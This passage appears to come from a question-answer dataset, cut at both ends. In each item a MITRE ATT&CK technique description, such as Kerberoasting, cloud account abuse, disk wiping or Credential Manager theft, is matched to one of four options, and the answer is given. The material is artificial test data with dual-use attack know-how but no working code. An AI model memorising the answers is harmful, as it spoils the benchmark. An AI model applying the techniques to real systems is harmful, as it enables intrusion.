      "choice": "B. Supply Chain Compromise: Compromise Software Supply Chain",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nValid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. \n\nService or user accounts may be targeted by adversaries through Brute Force, Phishing, or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto Remote Services. High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based Software Deployment Tools to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting Additional Cloud Credentials on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume Temporary Elevated Cloud Access or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through Cloud API or other methods.\nA. Unsecured Credentials: Bash History, B. Valid Accounts: Cloud Accounts, C. Email Collection: Remote Email Collection, D. Remote Service Session Hijacking: SSH Hijacking",
    "context": "",
    "output": "B. Valid Accounts: Cloud Accounts",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nValid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. \n\nService or user accounts may be targeted by adversaries through Brute Force, Phishing, or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto Remote Services. High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based Software Deployment Tools to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting Additional Cloud Credentials on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume Temporary Elevated Cloud Access or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through Cloud API or other methods.",
      "options": "A. Unsecured Credentials: Bash History, B. Valid Accounts: Cloud Accounts, C. Email Collection: Remote Email Collection, D. Remote Service Session Hijacking: SSH Hijacking",
      "choice": "B. Valid Accounts: Cloud Accounts",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, PowerShell modules like Azure for PowerShell, or software developer kits (SDKs) available for languages such as Python.  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as Application Access Token and Web Session Cookie), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.\n\nA. Data Obfuscation: Protocol Impersonation, B. Impair Defenses: Disable or Modify System Firewall, C. Active Scanning, D. Command and Scripting Interpreter: Cloud API\nAnswer:",
    "context": "",
    "output": "D. Command and Scripting Interpreter: Cloud API",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, PowerShell modules like Azure for PowerShell, or software developer kits (SDKs) available for languages such as Python.  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as Application Access Token and Web Session Cookie), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.",
      "options": "A. Data Obfuscation: Protocol Impersonation, B. Impair Defenses: Disable or Modify System Firewall, C. Active Scanning, D. Command and Scripting Interpreter: Cloud API",
      "choice": "D. Command and Scripting Interpreter: Cloud API",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\n\nModify System Image may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.\n\nOptions:\nA. Modify Authentication Process: Network Device Authentication, B. Data from Network Shared Drive, C. Non-Application Layer Protocol, D. Steal or Forge Kerberos Tickets",
    "context": "",
    "output": "A. Modify Authentication Process: Network Device Authentication",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\n\nModify System Image may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.",
      "options": "A. Modify Authentication Process: Network Device Authentication, B. Data from Network Shared Drive, C. Non-Application Layer Protocol, D. Steal or Forge Kerberos Tickets",
      "choice": "A. Modify Authentication Process: Network Device Authentication",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.\n\nAdversaries may use the information from The technique during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nA. Boot or Logon Autostart Execution, B. Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, C. System Service Discovery, D. Hijack Execution Flow: COR_PROFILER",
    "context": "",
    "output": "C. System Service Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.\n\nAdversaries may use the information from The technique during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "options": "A. Boot or Logon Autostart Execution, B. Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, C. System Service Discovery, D. Hijack Execution Flow: COR_PROFILER",
      "choice": "C. System Service Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force. \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials. \n\nThis same behavior could be executed using service tickets captured from network traffic.\n\nCracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.\n\nOptions:\nA. Credentials from Password Stores: Securityd Memory, B. Obfuscated Files or Information: Indicator Removal from Tools, C. Command and Scripting Interpreter: Visual Basic, D. Steal or Forge Kerberos Tickets: Kerberoasting",
    "context": "",
    "output": "D. Steal or Forge Kerberos Tickets: Kerberoasting",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force. \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials. \n\nThis same behavior could be executed using service tickets captured from network traffic.\n\nCracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.",
      "options": "A. Credentials from Password Stores: Securityd Memory, B. Obfuscated Files or Information: Indicator Removal from Tools, C. Command and Scripting Interpreter: Visual Basic, D. Steal or Forge Kerberos Tickets: Kerberoasting",
      "choice": "D. Steal or Forge Kerberos Tickets: Kerberoasting",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file. The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.\n\nA. Active Scanning, B. Phishing for Information: Spearphishing Attachment, C. Scheduled Task/Job: Scheduled Task, D. Plist File Modification\nA:",
    "context": "",
    "output": "B. Phishing for Information: Spearphishing Attachment",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file. The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.",
      "options": "A. Active Scanning, B. Phishing for Information: Spearphishing Attachment, C. Scheduled Task/Job: Scheduled Task, D. Plist File Modification",
      "choice": "B. Phishing for Information: Spearphishing Attachment",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file\u2019s signature, extension, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file\u2019s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file\u2019s type. For example, the header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`. \n\nAdversaries may edit the header\u2019s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., Ingress Tool Transfer) and stored (e.g., Upload Malware) so that adversaries may move their malware without triggering detections. \n\nCommon non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of <code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension.\n\nPolygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.\n\nA. Masquerading: Masquerade File Type, B. Create Account: Cloud Account, C. Valid Accounts: Local Accounts, D. Obfuscated Files or Information: Stripped Payloads\nAnswer:",
    "context": "",
    "output": "A. Masquerading: Masquerade File Type",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file\u2019s signature, extension, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file\u2019s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file\u2019s type. For example, the header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`. \n\nAdversaries may edit the header\u2019s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., Ingress Tool Transfer) and stored (e.g., Upload Malware) so that adversaries may move their malware without triggering detections. \n\nCommon non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of <code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension.\n\nPolygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.",
      "options": "A. Masquerading: Masquerade File Type, B. Create Account: Cloud Account, C. Valid Accounts: Local Accounts, D. Obfuscated Files or Information: Stripped Payloads",
      "choice": "A. Masquerading: Masquerade File Type",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).\n\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of Credentials from Web Browsers, Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\n\nCredential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\\Users\\\\Username\\AppData\\Local\\Microsoft\\\\Vault/Credentials\\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.\n\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.\n\nAdversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the \u201cBack up...\u201d button on the \u201cStored User Names and Passwords\u201d GUI.\n\nPassword recovery tools may also obtain plain text passwords from the Credential Manager.\n\nA. Create or Modify System Process: Systemd Service, B. Impair Defenses: Disable or Modify Cloud Logs, C. Gather Victim Host Information: Hardware, D. Credentials from Password Stores: Windows Credential Manager\nAnswer:",
    "context": "",
    "output": "D. Credentials from Password Stores: Windows Credential Manager",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).\n\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of Credentials from Web Browsers, Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\n\nCredential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\\Users\\\\Username\\AppData\\Local\\Microsoft\\\\Vault/Credentials\\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.\n\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.\n\nAdversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the \u201cBack up...\u201d button on the \u201cStored User Names and Passwords\u201d GUI.\n\nPassword recovery tools may also obtain plain text passwords from the Credential Manager.",
      "options": "A. Create or Modify System Process: Systemd Service, B. Impair Defenses: Disable or Modify Cloud Logs, C. Gather Victim Host Information: Hardware, D. Credentials from Password Stores: Windows Credential Manager",
      "choice": "D. Credentials from Password Stores: Windows Credential Manager",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.\n\nOn network devices, adversaries may wipe configuration files and other data from the device using Network Device CLI commands such as `erase`.\n\nA. Replication Through Removable Media, B. Remote Services: SSH, C. Disk Wipe, D. Boot or Logon Initialization Scripts: Network Logon Script\nA:",
    "context": "",
    "output": "C. Disk Wipe",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.\n\nOn network devices, adversaries may wipe configuration files and other data from the device using Network Device CLI commands such as `erase`.",
      "options": "A. Replication Through Removable Media, B. Remote Services: SSH, C. Disk Wipe, D. Boot or Logon Initialization Scripts: Network Logon Script",
      "choice": "C. Disk Wipe",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies. There are tools available to perform these changes.\n\nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019t checked at load time.\nA. Brute Force: Credential Stuffing, B. Event Triggered Execution: LC_LOAD_DYLIB Addition, C. Impersonation, D. Data Obfuscation: Protocol Impersonation",
    "context": "",
    "output": "B. Event Triggered Execution: LC_LOAD_DYLIB Addition",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies. There are tools available to perform these changes.\n\nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019t checked at load time.",
      "options": "A. Brute Force: Credential Stuffing, B. Event Triggered Execution: LC_LOAD_DYLIB Addition, C. Impersonation, D. Data Obfuscation: Protocol Impersonation",
      "choice": "B. Event Triggered Execution: LC_LOAD_DYLIB Addition",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.\n\nA. Data from Configuration Repository, B. Process Injection: Thread Local Storage, C. Steal Web Session Cookie, D. Impair Defenses: Disable or Modify Tools\nA:",
    "context": "",
    "output": "A. Data from Configuration Repository",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.",
      "options": "A. Data from Configuration Repository, B. Process Injection: Thread Local Storage, C. Steal Web Session Cookie, D. Impair Defenses: Disable or Modify Tools",
      "choice": "A. Data from Configuration Repository",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAn adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).\n \n\nThis account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to Create Account or modify a victim-owned account.\nA. Impair Defenses: Indicator Blocking, B. XSL Script Processing, C. Account Manipulation: Additional Cloud Roles, D. Debugger Evasion\nAnswer:",
    "context": "",
    "output": "C. Account Manipulation: Additional Cloud Roles",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAn adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).\n \n\nThis account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to Create Account or modify a victim-owned account.",
      "options": "A. Impair Defenses: Indicator Blocking, B. XSL Script Processing, C. Account Manipulation: Additional Cloud Roles, D. Debugger Evasion",
      "choice": "C. Account Manipulation: Additional Cloud Roles",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.\n\nA. Create or Modify System Process: Container Service, B. File and Directory Permissions Modification, C. Data from Information Repositories, D. BITS Jobs\nA:",
    "context": "",
    "output": "B. File and Directory Permissions Modification",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.",
      "options": "A. Create or Modify System Process: Container Service, B. File and Directory Permissions Modification, C. Data from Information Repositories, D. BITS Jobs",
      "choice": "B. File and Directory Permissions Modification",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.\n\nA defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.\n\nAdversaries may also use cloud-native mechanisms to share victim data with adversary-controlled cloud accounts, such as creating anonymous file sharing links or, in Azure, a shared access signature (SAS) URI.\n\nIncidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.\n\nA. OS Credential Dumping: LSA Secrets, B. Execution Guardrails: Environmental Keying, C. Transfer Data to Cloud Account, D. Modify Authentication Process: Network Device Authentication\nAnswer:",
    "context": "",
    "output": "C. Transfer Data to Cloud Account",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
